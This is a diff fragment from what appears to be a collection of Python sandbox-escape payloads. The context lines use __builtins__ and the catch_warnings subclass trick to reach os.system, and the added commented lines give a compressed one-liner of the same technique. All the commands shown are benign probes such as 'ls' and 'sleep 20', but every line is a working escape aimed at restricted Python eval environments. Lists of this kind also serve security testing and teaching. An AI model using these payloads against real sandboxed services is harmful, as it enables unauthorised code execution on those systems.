@@ -199,6 +199,9 @@ __builtin__.__dict__['__import__']("os").system("ls")
 __builtins__=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__)
 __builtins__['__import__']('os').system('sleep 20')
 __builtins__['__import__']('time').sleep(20)
+# compressed command
+# i=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__)['__import__']
+# i('os').system('sleep 20')
 
 
 # 2 : 
